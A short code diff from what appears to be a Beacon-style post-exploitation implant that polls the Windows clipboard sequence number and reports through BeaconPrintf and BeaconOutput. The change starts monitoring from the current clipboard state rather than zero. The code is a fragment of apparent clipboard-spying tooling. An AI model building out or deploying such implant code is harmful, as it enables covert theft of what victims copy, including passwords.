@@ -362,7 +362,7 @@ auto declfn instance::start(
     BeaconPrintf = (_BeaconPrintf)sd->pBeaconPrintf;
     BeaconOutput = (_BeaconOutput)sd->pBeaconOutput;
 
-    DWORD lastSeq = 0;
+    DWORD lastSeq = user32.GetClipboardSequenceNumber();
     do {
         DWORD currentSeq = user32.GetClipboardSequenceNumber();
 
